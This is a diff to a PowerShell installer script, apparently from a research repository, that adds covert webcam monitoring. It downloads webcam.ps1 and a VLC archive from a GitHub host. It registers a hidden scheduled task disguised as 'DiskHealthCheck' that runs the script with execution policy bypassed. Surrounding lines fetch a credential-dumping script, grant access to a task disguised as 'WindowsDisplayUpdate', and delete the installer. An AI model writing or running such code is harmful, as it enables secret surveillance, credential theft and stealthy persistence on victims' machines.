@@ -134,6 +134,10 @@ icacls "C:\Windows\System32\Tasks\WindowsDisplayUpdate" /grant Administrators:F
 # Download dump.cmd for credential dump
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/dump.cmd' -OutFile "C:\Users\Public\dump.cmd"
 
+# Download files for webcam monitoring
+$tempPath = [System.IO.Path]::GetTempPath()
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/webcam.ps1' -OutFile "$tempPath\webcam.ps1"
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/VLC.zip' -OutFile "$tempPath\VLC.zip"; Expand-Archive "$tempPath\VLC.zip" "$tempPath\VLC" -Force; Remove-Item "$env:TEMP\VLC.zip"
 
-    
+schtasks /create /tn "DiskHealthCheck" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File $tempPath\webcam.ps1" /sc ONCE /st 00:00 /ru INTERACTIVE 
 Remove-Item installer.ps1
